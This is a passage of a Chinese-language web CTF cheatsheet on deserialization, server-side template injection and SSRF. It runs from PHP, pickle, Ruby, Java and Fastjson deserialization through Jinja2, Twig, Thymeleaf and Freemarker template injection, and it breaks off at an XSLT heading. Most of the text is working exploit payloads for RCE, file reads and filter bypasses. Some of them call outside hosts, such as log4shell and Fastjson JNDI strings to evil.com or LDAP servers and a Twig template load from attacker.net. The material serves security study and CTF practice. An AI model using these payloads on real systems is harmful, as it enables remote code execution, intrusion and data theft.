# 反序列化

## PHP - Serialize() / Unserialize()

- `__construct()`
    - Object被new時調用，但unserialize()不調用
- `__destruct()`
    - Object被銷毀時調用
- `__wakeup()`
    - unserialize時自動調用
- `__sleep()`
    - 被serialize時調用
- `__toString()`
    - 物件被當成字串時調用

<br>

- Value
    - String
        - `s:size:value;`
    - Integer
        - `i:value;`
    - Boolean
        - `b:value;` ('1' or '0')
    - NULL
        - `N;`
    - Array
        - `a:size:{key definition; value definition; (repeat per element)}`
    - Object
        - `O:strlen(class name):class name:object size:{s:strlen(property name):property name:property definition;(repeat per property)}`
    - 其他
        - C - custom object
        - R - pointer reference


- Public / Private / Protected 序列化

    - 例如：class名字為: `Kaibro`，變數名字: `test`

    - 若為`Public`，序列化後：
        - `...{s:4:"test";...}`
    - 若為`Private`，序列化後：
        - `...{s:12:"%00Kaibro%00test"}`
    - 若為`Protected`，序列化後：
        - `...{s:7:"%00*%00test";...}`
    - Private和Protected會多兩個`NULL` byte

---

- Example
    
```php
    <?php

    class Kaibro {
        public $test = "ggininder";
        function __wakeup()
        {
            system("echo ".$this->test);
        }
    }

    $input = $_GET['str'];
    $kb = unserialize($input);
```

- Input: `.php?str=O:6:"Kaibro":1:{s:4:"test";s:3:";id";}`
- Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data) `

<br>

- Example 2 - Private

```php
    <?php

    class Kaibro {
        private $test = "ggininder";
        function __wakeup()
        {
            system("echo ".$this->test);
        }
    }

    $input = $_GET['str'];
    $kb = unserialize($input);

```

- Input: `.php?str=O:6:"Kaibro":1:{s:12:"%00Kaibro%00test";s:3:";id";}`

- Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

---

- CVE-2016-7124
    - 影響版本：
        - PHP5 < 5.6.25
        - PHP7 < 7.0.10
    - 物件屬性個數大於真正的屬性個數，會略過 `__wakeup` 的執行
    - 反序列化會失敗，但是 `__destruct` 會執行
    - HITCON 2016

- 小特性
    - `O:+4:"test":1:{s:1:"a";s:3:"aaa";}`
    - `O:4:"test":1:{s:1:"a";s:3:"aaa";}`
    - 兩者結果相同

- Fast Destruct
    - 強迫物件被 Destruct
    - 把物件放進 Array，並用相同的 key 蓋掉這個物件，即可強迫呼叫 `__destruct()`
        - `Array('key1' => classA, 'key1' => classB)`
    - https://github.com/ambionics/phpggc#fast-destruct
    - Example
        - [Balsn CTF 2020 - L5D](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2020#l5d)

- ASCII Strings
    - 使用 `S` 的序列化格式，則可以將字串內容改用 hex 表示
        - `s:5:"A<null_byte>B<cr><lf>";̀` => `S:5:"A\00B\09\0D";`
        - 繞 WAF
    - https://github.com/ambionics/phpggc#ascii-strings
    - Example
        - [Balsn CTF 2020 - L5D](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2020#l5d)
        - 网鼎杯2020 青龙组 - AreUSerialz

- Phar:// 反序列化
    - phar 文件會將使用者自定義的 metadata 以序列化形式保存
    - 透過 `phar://` 偽協議可以達到反序列化的效果
    - 常見影響函數: `file_get_contents()`, `file_exists()`, `is_dir()`, ...
    - 透過 phar 觸發反序列化時，檔名需要有副檔名(任意副檔名都行)
    - Payload generator
      ```
      <?php
        class TestObject {
        }

        @unlink("phar.phar");
        $phar = new Phar("phar.phar");
        $phar->startBuffering();
        $phar->setStub("<?php __HALT_COMPILER(); ?>");
        $o = new TestObject();
        $phar->setMetadata($o);
        $phar->addFromString("test.txt", "test");
        $phar->stopBuffering();
      ?>
      ```
    - php 識別 phar 是透過 `__HALT_COMPILER();?>`
        - 可以在開頭 stub 塞東西
        - e.g. 偽造 GIF 頭: `$phar->setStub('GIF89a'.'<?php __HALT_COMPILER();?>');`
    - trigger phar deserialization by zip
      ```
      <?php
        class FLAG{}

        $obj=serialize(new FLAG());
        $zip = new ZipArchive;
        $res = $zip->open('test.zip', ZipArchive::CREATE);
        $zip->addFromString('test.txt', 'meow');
        $zip->setArchiveComment($obj);
        $zip->close();

        // trigger:  phar://test.zip
      ```

    - trigger phar deserialization by tar
      ```
      <?php
      //@unlink("trigger.tar");
      class FLAG{}
      $phar = new PharData("trigger.tar");
      $phar["kaibro"] = "meow";
      $obj = new FLAG();
      $phar->setMetadata($obj);
      // trigger: phar://trigger.tar
      ```

    - Generic Gadget Chains
        - [phpggc](https://github.com/ambionics/phpggc)
    - bypass phar:// 不能出現在開頭
        - `compress.zlib://`, `compress.bzip2://`, ...
        - `compress.zlib://phar://meow.phar/test.txt`
        - `php://filter/read=convert.base64-encode/resource=phar://meow.phar`
    - Example
        - [N1CTF 2021 - easyphp](https://harold.kim/blog/2021/11/n1ctf-writeup/)
        - [N1CTF 2019 - sql_manage](https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/sql_manage/README.md)
        - [HITCON CTF 2017 - Baby^H Master](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017)
        - [HITCON CTF 2018 - Baby Cake PHP 2017](https://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/)
        - [DCTF 2018 - Vulture](https://cyku.tw/ctf-defcamp-qualification-2018/)

## Python Pickle

- `dumps()` 將物件序列化成字串
- `loads()` 將字串反序列化

Example:

a.py:

```python
import os
import cPickle
import sys
import base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))
    
shellcode = cPickle.dumps(Exploit())
print base64.b64encode(shellcode)
```

b.py:

```python
import os
import cPickle
import sys
import base64

s = raw_input(":")

print cPickle.loads(base64.b64decode(s))
```

```
$ python a.py > tmp
$ cat tmp | python b.py
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd)
```

<br>

- 補充: NumPy CVE-2019-6446 RCE
    - 影響 NumPy <=1.16.0
    - 底層使用 pickle

## Ruby/Rails Deserialization

- `BAh`: Marshal serialized data 的 base64 編碼特徵
- `secret_key_base`
    - 用於 `ActiveSupport::MessageVerifier` / `ActiveSupport::MessageEncryptor`
        - sign & encrypt cookies
        - ActiveStorage 反序列化
    - Rails 5.2 後，可透過 `credentials.yml.enc` 和 `master.key` 還原
        - [script](https://github.com/w181496/Web-CTF-Cheatsheet/blob/master/scripts/others/secret_key_base_decrypt.rb)

### Gadget chain

- Ruby 3.4 Universal RCE Deserialization Gadget Chain by Luke Jahnke (2024)
    - https://nastystereo.com/security/ruby-3.4-deserialization.html
- Execute commands by sending JSON? Learn how unsafe deserialization vulnerabilities work in Ruby projects by Peter Stöckli (2024)
    - https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/
- Discovering Deserialization Gadget Chains in Rubyland by Alex Leahu (2024)
    - https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- Ruby Deserialization - Gadget on Rails by httpvoid (2022)
    - https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md
- Universal gadget for ruby 2.x-3.x by vakzz (2021)
    - https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
- Universal RCE with Ruby YAML.load (versions > 2.7) by Etienne Stalmans  (2021)
    - https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/
- PBCTF 2020 - R0bynotes (2020)
    - ERB 無法用，改用 `ActiveModel::AttributeMethods::ClassMethods::CodeGenerator`
- Universal gadget for ruby 2.x by elttam (2018)
    - https://www.elttam.com/blog/ruby-deserialization/
- ERB gadget chain
    - https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md

### Ruby Marshal

this one is not self-executing

this one actually relies on rails invoking a method on the resulting object after the deserialization

```ruby
erb = ERB.allocate
erb.instance_variable_set :@src, "`id`"
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result, "foo", ActiveSupport::Deprecation
hash = {depr => 'something'}
marshalled = Marshal.dump(hash)
print marshalled
```

在 ERB 上，當 result 或 run method 被 call 時，@src 的 string 會被執行

- 常見使用情境：
    - 以 Marshal 為 Cookie Serializer 時，若有 `secret_key`，則可以偽造 Cookie
    - 也可以透過 `DeprecatedInstanceVariableProxy` 去執行 ERB 的 `result` 來 RCE
        - 當 `DeprecatedInstanceVariableProxy` 被 unmarshal，rails session 對他處理時遇到不認識的 method 就會呼叫 `method_missing`，導致執行傳入的 ERB
        - `@instance.__send__(@method)`

- Cookie Serializer
    - Rails 4.1 以前的 Cookie Serializer 為 Marshal
    - Rails 4.1 開始，默認使用 JSON

### Ruby/Rails YAML

- CVE-2013-0156
    - 舊版本的 Rails 中，`XML` 的 node 可以自訂 type，如果指定為 `yaml`，是會被成功解析的
    - 若反序列化 `!ruby/hash`，則相當於在物件上調用 `obj[key]=val`，也就是 `[]=` 方法
    - 而這個 `ActionDispatch::Routing::RouteSet::NamedRouteCollection` 中的 `[]=` 方法中，有一條代碼路徑可以 eval
    - `define_hash_access` 中可以看到 `module_eval`，裏頭的 `selector` 來自 `name`
    - 因為他還會對 `value` 調用 `defaults` method，所以可以利用 `OpenStruct` 來構造
        - `函數名=>返回值`的對應關係存放在 `@table` 中
    - Payload:
    ```ruby
    xml = %{  
    <?xml version="1.0" encoding="UTF-8"?>  
    <bingo type='yaml'>  
    ---| !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection  
    'test; sleep(10); test' :  
     !ruby/object:OpenStruct  
      table:  
       :defaults: {}  
    </bingo>

    }.strip
    ```
- CVE-2013-0333
    - Rails 2.3.x 和 3.0.x 中，允許 `text/json` 的 request 轉成 `YAML` 解析
    - `Yaml` 在 Rails 3.0.x 是預設的 `JSON Backend`
    - 出問題的地方在於 `YAML.load` 前的 `convert_json_to_yaml`，他不會檢查輸入的 JSON 是否合法
    - 一樣可以透過 `ActionController::Routing::RouteSet::NamedRouteCollection#define_hash_access` 的 `module_eval` 來 RCE

## Java Deserialization

- 序列化資料特徵
    - `ac ed 00 05 ...`
    - `rO0AB ...` (Base64)
- 反序列化觸發點
    - `readObject()`
    - `readExternal()`
    - ...
- RMI
    - 攻擊情境
        - Client 打 Registry
            - lookup
        - Server 打 Registry
            - bind/unbind/rebind
        - ...
    - 攻擊路徑與版本限制
        - `list`
            - 可以探測 RMI endpoint
            - 工具: BaRMIe
        - `lookup`
            - version < 8u121: 直接打反序列化
            - 8u121 <= version < 8u231: UnicastRef + JRMPListener (JEP290 Bypass)
            - 8u231 <= version < 8u241: UnicastRefRemoteObject + JRMPListener (JEP290 Bypass)
        - `bind`/`unbind`/`rebind`
            - 8u141 前，先反序列化才檢查來源，可強制反序列化
                - ~8u121: 直接 bind/rebind 反序列化
                - 8u121 ~ 8u141: bind/rebind 配合 JRMP 反序列化 (JEP290 Bypass)
            - ysoserial 的 `RMIRegistryExploit` 即是打 `bind`
                - `java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections7 "open /System/Applications/Calculator.app"`
        - 打 DGC 層
            - 8u121 後，受 JEP290 限制無法打
            - ysoserial 的 `JRMPClient` 可以用來打 DGC
                - `java -cp ysoserial.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections7 "open /System/Applications/Calculator.app"`
        - JEP 290 Bypass (8u121)
            - Registry & DGC 預設被 JEP290 白名單擋
            - 可透過 JRMP 繞過
        - 已知 Object 類型呼叫方法
            - 若已知 endpoint 呼叫方法，且為參數為 Object 類型，可直接打反序列化 (不受版本限制)
        - ...
- JEP290
    - Java 9 新特性，並向下支援到 8u121, 7u13, 6u141
    - 增加黑、白名單機制
    - Builtin Filter
        - JDK 包含了 Builtin Filter (白名單機制) 在 RMI Registry 和 RMI Distributed Garbage Collector
        - 只允許特定 class 被反序列化
        - 許多 RMI Payload 失效 (即便 classpath 有 gadegt)
- JNDI Injection
    - 攻擊情境
        - 攻擊者輸入拼接至 JNDI lookup 等查詢函數
        - 反序列化轉 JNDI Injection
        - log4shell
        - ...
    - 攻擊路徑與版本限制
        - Codebase
            - JDK 6u45, 7u21 開始，`useCodebaseOnly` 預設為 true
                - 禁止自動載入遠端 class 文件
            - JDK 6u132, 7u122, 8u113 下，`com.sun.jndi.rmi.object.trustURLCodebase`, `com.sun.jndi.cosnaming.object.trustURLCodebase` 預設為 false
                - RMI 預設不允許從遠端 Codebase 載入 Reference class
            - JDK 11.0.1, 8u191, 7u201, 6u211 後，`com.sun.jndi.ldap.object.trustURLCodebase` 預設為 false
                - LDAP 預設不允許從遠端 Codebase 載入 Reference class
        - 高版本JDK (8u191+)
            - codebase 無法利用 (trustURLCodebase=false)
            - 可能攻擊路徑
                - 1. 找可利用的 ObjectFactory
                    - e.g. Tomcat 下可利用 `org.apache.naming.factory.BeanFactory` + `javax.el.ELProcessor`
                - 2. 透過 `javaSerializedData` 進行反序列化
        - 更高版本JDK (JDK20+)
            - 限制
                - JDK-8290367: com.sun.jndi.ldap.object.trustSerialData=false  (by default)
                    - JNDI Injection + LDAP 反序列化，受限制
                - JDK-8290368: 新增 ObjectFactoriesFilter 
                    - 本地 ObjectFactory，受限制
            - 可能攻擊路徑
                - 透過 RMI 打反序列化
    - ObjectFactory Gadgets
        - `org.apache.naming.factory.BeanFactory`
            - 透過 `forceString` 可執行單一字串參數的 method
            - 常配合 `ELProcessor` or `GroovyShell` 來 RCE
            - 限制
                - `forceString` 在 Tomcat 9.0.63 後被移除 ([ref](https://github.com/apache/tomcat/commit/df7da6c29aace17c92fe47fe386ab14ece59b5d4))
            - Template
            ```java
            ResourceRef ref = new ResourceRef(RESOURCECLASS , null, "", "", true, FACTORY, null);
            ref.add(new StringRefAddr("forceString", "x=FUNC_NAME"));
            ref.add(new StringRefAddr("x",VALUE));
            ```
        - `javax.el.ELProcessor`
            - `eval` 剛好吃一個字串參數，常配合 BeanFactory 來 RCE
            - 限制
                - Tomcat 8 才引入
        - `groovy.lang.GroovyShell`
            - 類似 ELProcessor，`evaluate` 只吃一個字串參數，常配合 BeanFactory 來 RCE
            - 限制
                - 需環境有 Groovy 相依
        - `org.apache.commons.configuration2.SystemConfiguration` / `org.apache.commons.configuration.SystemConfiguration`
            - `setSystemProperties` method 可以設定系統屬性
            - `fileName` 可以傳入本地文件，也可以是遠端請求
            - 可以透過此方法修改系統屬性，來繞過防禦限制
                - 例如 `org.apache.commons.collections.enableUnsafeSerialization=true` 繞反序列化限制
        - `org.yaml.snakeyaml.Yaml`
            - `load` method 透過 SPI 載入遠端 jar/class 來 RCE
            - 常配合 BeanFactory 一起使用
        - `org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory`
            - 類似 BeanFactory，可以呼叫類別的所有 set 開頭的方法
            - 可以結合 `SystemConfiguration` 修改系統屬性
        - ... and more
    - log4shell
        - Payload
            - `${jndi:ldap://evil.com/payload}` (same as normal jndi injection)
            - `${jndi:ldap://${sys:java.version}.dns.evil.com/a}` (leak java version by dns oob)
                - `${sys:user.name}`
                - `${sys:os.name}`
                - `${sys:os.arch}`
                - `${java:os}`
                - `${env:USERNAME}`
                - `${web:rootDir}`
                - ...
    - 反序列化轉 JNDI Injection
        - `org.springframework.transaction.jta.JtaTransactionManager#readObject`
            - 環境需引入 spring-tx.jar
        - `oracle.jdbc.rowset.OracleCachedRowSet#getConnection`
        - `com.sun.rowset.JdbcRowSetImpl`
        - ...
    - 其他限制
        - rmi / ldap 被黑名單阻擋時
            - 可嘗試 `ldaps`
            - ref: https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html
- JSON Deserialization
    - Fastjson
        - 反序列化方法
            - `parse()`
            - `parseObject()`
            - `parseArray()`
        - Fingerprinting
            - DNSLOG: 
                - {% raw %}`{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.com"}}`{% raw %}
                - {% raw %}`{{"@type":"java.net.URL","val":"http://dnslog.com"}:"a"}`{% raw %}
        - fastjson 1.2.24
            - fastjson <= 1.2.24
            - JdbcRowSetImpl gadget (JNDI): `{"@type" : "com.sun.rowset.JdbcRowSetImpl","dataSourceName" : "ldap://kaibro.tw:1389/evil","autoCommit" : true}`
            - TemplatesImpl gadget: `{"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes": ["yv66vgA...JAAk="],"_name": "kaibro","_tfactory": {},"_outputProperties": {},}`
        - fastjson 1.2.25
            - 1.2.25 <= fastjson <= 1.2.41
            - 黑名單繞過 (`L` & `;`)
            - 需開啟 AutoType (預設關閉)
            - `{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://127.0.0.1:23457/Exploit","autoCommit":true}`
        - fastjson 1.2.42
            - 黑名單繞過 (`L` & `;` 兩次)
            - `{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://127.0.0.1:23457/Exploit","autoCommit":true}`
        - fastjson 1.2.43
            - 1.2.25 <= fastjson <= 1.2.43
            - 黑名單繞過 (`[`)
            - `{"@type":"[com.sun.rowset.JdbcRowSetImpl"[,{"dataSourceName":"ldap://127.0.0.1:23457/Exploit","autoCommit":true}`
        - fastjson 1.2.45
            - 1.2.25 <= fastjson <= 1.2.45
            - 黑名單繞過 (JndiDataSourceFactory)
            - `{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://127.0.0.1:23457/Exploit"}}`
        - fastjson 1.2.47
            - 1.2.25-1.2.32 未開啟 AutoTypeSupport 時能利用 (開啟時不行)
            - 1.2.33-1.2.47 無論是否開啟 AutoTypeSupport 都能利用
            - `{"a": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"}, "b": {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://localhost:1389/Exploit", "autoCommit": true}}`
        - more
            - https://github.com/safe6Sec/Fastjson
        - Example
            - [Aliyun CTF 2023 - ezbean](https://nese.team/writeup/aliyunctf2023.pdf)
            - [N1CTF 2022 - Old FastJSON](https://nese.team/writeup/n1ctf2022.pdf)
- Tool
    - [yososerial](https://github.com/frohoff/ysoserial)
        - URLDNS: 不依賴任何額外library，可以用來做 dnslog 驗證
        - CommonCollections 1~7: Common collections 各版本 gadget chain
        - ...
    - [BaRMIe](https://github.com/NickstaDB/BaRMIe)
        - 專打 Java RMI (enumerating, attacking)
    - [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
        - RMI vulnerability scanner
    - [marshalsec](https://github.com/mbechler/marshalsec)
    - [SerializationDumper](https://github.com/NickstaDB/SerializationDumper)
        - 分析 Serialization Stream，如 Magic 頭、serialVersionUID、newHandle 等
    - [gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector)
        - Bytecode Analyzer
        - 找 gadget chain
    - [GadgetProbe](https://github.com/BishopFox/GadgetProbe)
        - 透過字典檔配合 DNS callback，判斷環境使用哪些 library, class 等資訊
    - [JNDI-Injection-Bypass](https://github.com/welk1n/JNDI-Injection-Bypass)
- [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
- Example
    - [0CTF 2022 - hessian-onlyjdk](https://gist.github.com/CykuTW/4c0d105df24acf2218e0aedb67661da9)
        - hessian2 反序列化
    - [0CTF 2022 - 3rm1](https://github.com/ceclin/0ctf-2022-soln-3rm1)
    - [Balsn CTF 2021 - 4pple Music](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2021#4pple-music)
    - [0CTF 2021 Qual - 2rm1](https://github.com/ceclin/0ctf-2021-2rm1-soln)
    - [0CTF 2019 Final - hotel booking system](https://balsn.tw/ctf_writeup/20190608-0ctf_tctf2019finals/#tctf-hotel-booking-system)
    - [TrendMicro CTF 2018 Qual - Forensics 300](https://github.com/balsn/ctf_writeup/tree/master/20180914-trendmicroctf#300-3)
    - [TrendMicro CTF 2019 Qual - Forensics 300](https://github.com/w181496/CTF/tree/master/trendmicro-ctf-2019/forensics300)
    - TrendMicro CTF 2019 Final - RMIart


## .NET Derserialization
- Tool
    - [ysoserial.net](https://github.com/pwntester/ysoserial.net)
- asp.net 中 ViewState 以序列化形式保存資料
    - 有 machinekey 或 viewstate 未加密/驗證時，有機會 RCE
- Example
    - [HITCON CTF 2018 - Why so Serials?](https://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/)

# SSTI 

Server-Side Template Injection

![img](https://i.imgur.com/GVZeVq6.png)

## Testing
- ` {{ 7*'7' }}`
    - Twig: `49`
    - Jinja2: `7777777`
- `<%= 7*7 %>`
    - Ruby ERB: `49`

## Flask/Jinja2
- Dump all used classes
    - `{{ ''.__class__.__mro__[2].__subclasses__() }}
`
- Read File
    - `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`
- Write File
    - `{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt', 'w').write('Kaibro Yo!')}}`
- RCE
    - `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}`
        - evil config
    - `{{ config.from_pyfile('/tmp/evilconfig.cfg') }}`
        - load config
    - `{{ config['RUNCMD']('cat flag',shell=True) }}`

- RCE (another way)
    - `{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls').read()}}`
- Python3 RCE
    - ```python
      {% for c in [].__class__.__base__.__subclasses__() %}
        {% if c.__name__ == 'catch_warnings' %}
          {% for b in c.__init__.__globals__.values() %}
          {% if b.__class__ == {}.__class__ %}
            {% if 'eval' in b.keys() %}
              {{ b['eval']('__import__("os").popen("id").read()') }}
            {% endif %}
          {% endif %}
          {% endfor %}
        {% endif %}
      {% endfor %}
      ```
- 過濾中括號
    - `__getitem__`
    - `{{''.__class__.__mro__.__getitem__(2)}}`
        - `{{''.__class__.__mro__[2]}}`
- 過濾`{{` or `}}`
    - 用`{%%}`
    - 執行結果往外傳
- 過濾`.`
    - `{{''.__class__}}`
        - `{{''['__class__']}}`
        - `{{''|attr('__class__')}}`
- 過濾Keyword
    - 用 `\xff` 形式去繞
    - `{{''["\x5f\x5fclass\x5f\x5f"]}}`
- 用request繞
    - `{{''.__class__}}`
        - `{{''[request.args.kaibro]}}&kaibro=__class__`

## Twig / Symfony

- RCE
    - `{{['id']|map('passthru')}}`
    - `{{['id']|filter('system')}}`
    - `{{app.request.query.filter(0,'curl${IFS}kaibro.tw',1024,{'options':'system'})}}`
    - `{{_self.env.setCache("ftp://attacker.net:21")}}{{_self.env.loadTemplate("backdoor")}}`
    - `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- Read file
    - `{{'/etc/passwd'|file_excerpt(30)}}`
- Version
    - `{{constant('Twig\\Environment::VERSION')}}`

## thymeleaf

- Java
- 常見注入情境: https://github.com/veracode-research/spring-view-manipulation/
- Some payload
    - `__${T(java.lang.Runtime).getRuntime().availableProcessors()}__::..x`
    - `__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x`
    - `__*{new.java.lang.String(new.java.lang.ProcessBuilder('ls', '-al').start().getInputStream().readAllBytes())}__::.`
- 高版本限制
    - 檢查 view name 是否有 expression: [src link](https://github.com/thymeleaf/thymeleaf-spring/blob/f078508ce7d1d823373964551a007cd35fad5270/thymeleaf-spring6/src/main/java/org/thymeleaf/spring6/util/SpringRequestUtils.java#L42-L48)
        - 繞過: `**{}` 邏輯問題 ([src link](https://github.com/thymeleaf/thymeleaf-spring/blob/f078508ce7d1d823373964551a007cd35fad5270/thymeleaf-spring6/src/main/java/org/thymeleaf/spring6/util/SpringRequestUtils.java#L87)) 
    - 檢查 expression 是否有 object instantiation: [src link](https://github.com/thymeleaf/thymeleaf-spring/blob/f078508ce7d1d823373964551a007cd35fad5270/thymeleaf-spring6/src/main/java/org/thymeleaf/spring6/util/SpringStandardExpressionUtils.java#L38)
        - 繞過: `T%00()` ([src link](https://github.com/spring-projects/spring-framework/blob/9cf7b0e230af83e08efa73a43334c75f6110988f/spring-expression/src/main/java/org/springframework/expression/spel/standard/Tokenizer.java#L260))
    - `isMemberAllowed()` 檢查: [src link](https://github.com/thymeleaf/thymeleaf/blob/eb546cc968b4393f813c07c29de084740c1a2b2f/lib/thymeleaf/src/main/java/org/thymeleaf/util/ExpressionUtils.java#L187)
        - 繞過: 透過 `org.springframework.util.ReflectionUtils` 來反射
- Example
    - [WCTF 2020 - thymeleaf](https://github.com/w181496/CTF/tree/master/wctf2020/thymeleaf)
    - [DDCTF 2020 - Easy Web](https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/)
    - Codegate 2023 - AI
        - from Pew: `$__|{springRequestContext.getClass().forName("org.yaml.snakeyaml.Yaml").newInstance().load(thymeleafRequestContext.httpServletRequest.getParameter("a"))}|__(xx=id)?a=!!org.springframework.context.support.FileSystemXmlApplicationContext ["https://thegrandpewd.pythonanywhere.com/pwn.bean"]`
    - DEVCORE Wargame 2024 - Spring
        - thymeleaf 3.0.15: `__*{new.java.lang.String(new.java.lang.ProcessBuilder('/readflag', 'give','me','the','flag').start().getInputStream().readAllBytes())}__::.`

## Freemarker

- `${"freemarker.template.utility.Execute"?new()("calc")}`
- `${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}`
- `<#assign value="freemarker.template.utility.Execute"?new()>${value("Calc")}`
- `<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","Calc").start()}`

## Golang

- module
    - [html/template](https://pkg.go.dev/html/template)
    - [text/template](https://pkg.go.dev/text/template)
- Testing
    - `{{87}}`
    - `{{.}}`
    - `{{"meow"|print}}`
    - `{{"<script>alert(/xss/)</script>"}}`
    - `{{ .MyFunc "arg1" "arg2" }}`
        - 需上下文有定義 `MyFunc` 函數
    - ...
- [Echo](https://github.com/labstack/echo) gadget
    - `{{.File "/etc/passwd"}}`
    - `{{.Echo.Filesystem.Open "/etc/passwd"}}`
    - `{{.Echo.Static "/meow" "/"}}`
    - Example:
        - [ACSC CTF 2023 - easyssti](https://blog.hamayanhamayan.com/entry/2023/02/26/124239#web-easySSTI)
            - `{{ $x := .Echo.Filesystem.Open "/flag" }} {{ $x.Seek 1 0 }} {{ .Stream 200 "text/plain" $x }}` (by @nyancat)
            - `{{ (.Echo.Filesystem.Open "/flag").Read (.Get "template") }} {{ .Get "template" }}` (by @maple3142)
            - `{{ $f := .Echo.Filesystem.Open "/flag" }} {{ $buf := .Get "template" }} {{ $f.Read $buf }} {{ $buf }` (by @Ocean)

## AngularJS
- v1.6 後移除 Sandbox
- Payload
    - `{{ 7*7 }}` => 49
    - `{{ this }}`
    - `{{ this.toString() }}`
    - `{{ constructor.toString() }}`
    - `{{ constructor.constructor('alert(1)')() }}` 2.1 v1.0.1-v1.1.5
    - `{{ a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() }}` 2.1 v1.0.1-v1.1.5
    - `{{ toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)  }}` 2.3 v1.2.19-v1.2.23
    - `{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}` v1.2.24-v1.2.29
    - `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}` v1.3.20
    - `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}` v1.4.0-v1.4.9
    - `{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}` v1.5.0-v1.5.8
    - `{{ [].pop.constructor('alert(1)')() }}` 2.8 v1.6.0-1.6.6

## Vue.js
- `{{constructor.constructor('alert(1)')()}}`
- https://github.com/dotboris/vuejs-serverside-template-xss

## Python
- `%`
    - 輸入 `%(passowrd)s` 即可偷到密碼：
    ```python
    userdata = {"user" : "kaibro", "password" : "ggininder" }
    passwd  = raw_input("Password: ")
    if passwd != userdata["password"]:
        print ("Password " + passwd + " is wrong for user %(user)s") % userdata
    ```
- `f`
    - python 3.6
    - example
        - `a="gg"`
        - `b=f"{a} ininder"`
            - `>>> gg ininder`
    - example2
        - `f"{os.system('ls')}"`

## Tool
- https://github.com/epinna/tplmap

---

http://blog.portswigger.net/2015/08/server-side-template-injection.html

# SSRF

## Find SSRF

- Webhook
    - Exmaple: https://hackerone.com/reports/56828
- From XXE to SSRF
    - `<!ENTITY xxe SYSTEM "http://192.168.1.1/secret">`
- PDF generator / HTML renderer
    - 插 JS, Iframe, ...
    - e.g. `<iframe src="file:///C:/Windows/System32/drivers/etc/hosts>`
- Open Graph
    - `<meta property="og:image" content="http://kaibro.tw/ssrf">`
- SQL Injection
    - e.g. Oracle: `?id=1 union select 1,2,UTL_HTTP.request('http://10.0.0.1/secret') from dual`
- SVG parsing
    - xlink: `<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="http://<EXAMPLE_SERVER>/image.jpeg" /></svg>`
    - More payload: https://github.com/cujanovic/SSRF-Testing/tree/master/svg
    - Bug Bounty Example: https://hackerone.com/reports/223203
- ImageTragick
    - CVE-2016-3718
    ```
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(http://example.com/)'
    pop graphic-context
    ```

- HTTPoxy
    - CGI 自動將 header `Proxy` 代入成環境變數 `HTTP_Proxy`
    - `Proxy: http://evil.com:12345/`
- XSLT
```xml
